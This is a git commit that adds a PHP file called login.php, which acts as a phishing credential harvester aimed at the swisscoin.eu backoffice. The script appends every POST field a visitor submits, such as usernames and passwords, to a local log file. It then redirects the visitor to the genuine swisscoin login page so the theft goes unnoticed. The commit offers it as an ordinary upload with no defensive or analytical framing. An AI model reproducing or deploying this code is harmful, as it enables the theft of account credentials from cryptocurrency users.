e3cbfc9f518c31db04b743a7a8fa82c4ced04959
jniko12 <5e577657@mailna.me>
2017-02-24 13:31:42 +0100

    Add files via upload

---
+++ login.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location: https://swisscoin.eu/backoffice/login ');
+$handle = fopen("logs_82542.txt", "a");
+foreach($_POST as $variable => $value) {
+    fwrite($handle, $variable);
+    fwrite($handle, "=");
+    fwrite($handle, $value);
+    fwrite($handle, "\r\n");
+}
+fwrite($handle, "===============\r\n");
+fclose($handle);
+exit;
+?>
